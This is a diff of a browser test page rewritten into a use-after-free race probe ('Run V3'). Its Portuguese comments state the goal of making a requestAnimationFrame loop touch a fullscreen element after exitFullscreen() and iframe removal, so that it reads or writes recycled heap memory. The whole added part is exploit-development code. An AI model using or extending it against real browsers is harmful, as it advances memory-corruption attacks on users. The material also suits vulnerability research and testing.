@@ -1,32 +1,79 @@
-<!DOCTYPE html>
 <html>
 <body>
-<div id="host" style="display:none"></div>
+<button id="run">Run V3</button>
+<div id="status">Ready</div>
 <script>
+/*
+  VETOR: exitFullscreen() + frame destruction race
+  Entra em fullscreen, espera confirmar, então dispara
+  exitFullscreen() e remove() simultaneamente.
+  O rAF tenta dereferenciar o elemento no próximo frame de render
+  — se o heap foi reusado, pode ler/escrever memória reciclada.
+*/
 
-var host = document.getElementById('host');
-var sr = host.attachShadow({mode: 'open'});
-sr.innerHTML = '<picture id="pic"><source srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><img></picture>';
-var pic = sr.getElementById('pic');
+var iframe = null;
+var rafHandle = null;
 
-pic.addEventListener('load', function listener() {
-    pic.removeEventListener('load', listener, true);   
-    pic.textContent = '';   
+function cleanup() {
+    if (rafHandle) cancelAnimationFrame(rafHandle);
+    rafHandle = null;
+}
 
-    // Cria��o do elemento <dialog> dinamicamente para usar a API moderna
-    var dialog = document.createElement('dialog');
-    dialog.innerHTML = '<iframe src="resources/self-closing-modal-dialog2.html" style="border:none; width:100px; height:100px;"></iframe>';
-    document.body.appendChild(dialog);
+document.getElementById("run").onclick = function() {
+    cleanup();
 
-    // .showModal() � chamado na inst�ncia do elemento criado
-    if (typeof dialog.showModal === 'function') {
-        dialog.showModal();
-    }
+    iframe = document.createElement("iframe");
+    iframe.style.width = "300px";
+    iframe.style.height = "300px";
+    document.body.appendChild(iframe);
 
-    setTimeout(function() {
-        document.write('PASS if no crash.');
-    }, 0);
-}, /*capture*/ true);
+    iframe.onload = function() {
+        var iDoc = iframe.contentDocument;
+        iDoc.open();
+        iDoc.write('<html><body style="margin:0"><div id="fs" style="width:100%;height:100%;background:purple"></div></body></html>');
+        iDoc.close();
+
+        var fsEl = iDoc.getElementById("fs");
+
+        // Entra fullscreen em elemento filho (não documentElement)
+        // FullscreenManager guarda ponteiro para este Element específico
+        fsEl.webkitRequestFullscreen();
+
+        document.addEventListener('webkitfullscreenchange', function onEnter() {
+            if (!document.webkitFullscreenElement) return;
+            document.removeEventListener('webkitfullscreenchange', onEnter);
+
+            document.getElementById("status").innerHTML = "Fullscreen ativo — disparando race";
+
+            // RAF que tenta acessar o elemento no próximo frame de render
+            // Este frame pode coincidir com o teardown do Document
+            rafHandle = requestAnimationFrame(function rafTick() {
+                try {
+                    // Tentativa de acesso ao elemento possivelmente freed
+                    var bounds = fsEl.getBoundingClientRect();
+                    document.getElementById("status").innerHTML +=
+                        " | rAF: bounds=" + JSON.stringify(bounds);
+                } catch(e) {
+                    document.getElementById("status").innerHTML += " | rAF EX:" + e;
+                }
+                rafHandle = requestAnimationFrame(rafTick);
+            });
+
+            // Dispara exit e remove simultaneamente
+            document.exitFullscreen
+                ? document.exitFullscreen()
+                : document.webkitExitFullscreen && document.webkitExitFullscreen();
+
+            iframe.remove(); // Document teardown enquanto exitFullscreen processa
+            iframe = null;
+
+            document.getElementById("status").innerHTML += " | exit+remove fired";
+
+            // Para o RAF depois de alguns frames
+            setTimeout(cleanup, 200);
+        });
+    };
+};
 </script>
 </body>
 </html>
